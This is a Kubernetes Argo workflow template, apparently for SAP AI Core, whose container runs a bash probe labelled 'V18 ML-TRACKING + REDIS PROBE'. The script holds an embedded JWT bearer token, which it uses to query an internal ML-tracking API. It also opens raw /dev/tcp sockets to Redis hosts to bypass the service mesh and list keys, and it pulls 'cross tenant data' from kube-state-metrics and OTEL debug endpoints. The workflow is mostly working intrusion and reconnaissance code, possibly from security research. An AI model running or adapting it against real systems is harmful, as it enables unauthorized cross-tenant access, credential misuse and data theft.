apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "18.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V18 ML-TRACKING + REDIS PROBE ==="
        
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        JWT="eyJ0eXAiOiJKV1QiLCJqaWQiOiJLakRWeGNCbGZGTEVNc1dsRDdXMmVYaVZvWTNJTTdkbjVmODJvY1VDSXNFPSIsImFsZyI6IlJT...T8e2XAZ8wqNkZOn-vW6g"
        FULL_JWT="eyJ0eXAiOiJKV1QiLCJqaWQiOiJLakRWeGNCbGZGTEVNc1dsRDdXMmVYaVZvWTNJTTdkbjVmODJvY1VDSXNFPSIsImFsZyI6IlJTMjU2Iiwiamt1IjoiaHR0cHM6Ly9jZi1haWNvcmUtc2VjdXJpdHktYmItMTQuYXV0aGVudGljYXRpb24uZXUxMC5oYW5hLm9uZGVtYW5kLmNvbS90b2tlbl9rZXlzIiwia2lkIjoiZGVmYXVsdC1qd3Qta2V5LTdjY2ZkMmVjNzgifQ..nIOksUsdmF4S6tdryve0na67gkTLbDJmEhvSC1h4Kf5qXWIMsTqhadRsTjUe-d1fiyrCAVKKDPTGBkX-9DUeHdQu9fMzdvmoeEPoX92iokn9rBBNpj34HtPnr9mNB3YVsbi8kDE88N6FS_wo7_7KLgKCcefkhjQcTx4aMRHPfrOubQe6hHuCnLxB6QHPN4yVh5ro0i52MlYeejdb732NtygvMIDA-HU2y0VCHpvzM4dBq1leh4cNRPH_q8EtpiSVQVOQ_qEZPI21HNr687JC-z0Dk1zR9tkmfC7QudbGYnafjG1eTscMtGSuCOdGgiAQSlT8e2XAZ8wqNkZOn-vW6g"
        
        # === ML TRACKING WITH REAL JWT ===
        echo "=== ML-TRACKING WITH REAL JWT ==="
        echo "--- Root ---"
        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
        echo ""
        
        echo "--- /api/v1/metrics ---"
        curl -s --connect-timeout 5 "$TRACK/api/v1/metrics" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
        echo ""
        
        echo "--- /api/v1/experiments ---"
        curl -s --connect-timeout 5 "$TRACK/api/v1/experiments" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
        echo ""
        
        echo "--- /api/v1/runs ---"
        curl -s --connect-timeout 5 "$TRACK/api/v1/runs" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
        echo ""
        
        echo "--- /api/v1/info ---"
        curl -s --connect-timeout 5 "$TRACK/api/v1/info" -H "Authorization: Bearer $FULL_JWT" 2>&1 | head -c 500
        echo ""
        
        # Also try with different resource groups
        echo "--- Different RG header ---"
        curl -s --connect-timeout 5 "$TRACK/api/v1/metrics" \
          -H "Authorization: Bearer $FULL_JWT" \
          -H "AI-Resource-Group: default" 2>&1 | head -c 500
        echo ""
        
        # === REDIS PROBES ===
        echo "=== REDIS PROBES ==="
        
        for REDIS_HOST in "100.107.100.17" "100.109.69.212"; do
          echo "--- Redis $REDIS_HOST ---"
          
          # Try direct TCP (bypass Istio if possible)
          echo "TCP PING:"
          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'PING\r' >&3 && sleep 1 && cat <&3 && exec 3>&-" 2>&1
          echo ""
          
          echo "TCP INFO:"
          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'INFO\r' >&3 && sleep 2 && head -c 1000 <&3 && exec 3>&-" 2>&1
          echo ""
          
          echo "TCP KEYS:"
          timeout 5 bash -c "exec 3<>/dev/tcp/$REDIS_HOST/6379 2>/dev/null && echo -e 'KEYS *\r' >&3 && sleep 2 && head -c 1000 <&3 && exec 3>&-" 2>&1
          echo ""
        done
        
        # Try redis-cli if available
        which redis-cli 2>/dev/null && {
          for REDIS_HOST in "100.107.100.17" "100.109.69.212"; do
            echo "redis-cli $REDIS_HOST:"
            redis-cli -h $REDIS_HOST PING 2>&1 | head -c 200
            redis-cli -h $REDIS_HOST INFO server 2>&1 | head -c 500
            echo ""
          done
        } || echo "No redis-cli available"
        
        # === KSM FULL DUMP (pods - cross tenant data) ===
        echo "=== KSM PODS SAMPLE ==="
        curl -s --connect-timeout 5 "http://100.106.241.163:8080/metrics" 2>&1 | grep -E "^kube_pod_info" | head -30
        echo ""
        
        # Count unique namespaces from KSM
        echo "=== NAMESPACE COUNT ==="
        curl -s --connect-timeout 5 "http://100.106.241.163:8080/metrics" 2>&1 | grep -oP 'namespace="[^"]+"' | sort -u
        echo ""
        
        # === OTEL COLLECTOR ===
        echo "=== OTEL COLLECTOR ==="
        curl -s --connect-timeout 5 "http://100.109.242.36:55679/debug/tracez" 2>&1 | head -c 500
        echo ""
        curl -s --connect-timeout 5 "http://100.109.242.36:55679/debug/servicez" 2>&1 | head -c 500
        echo ""
        curl -s --connect-timeout 5 "http://100.109.242.36:8888/metrics" 2>&1 | head -c 500
        echo ""
        
        echo "=== V18 COMPLETE ==="
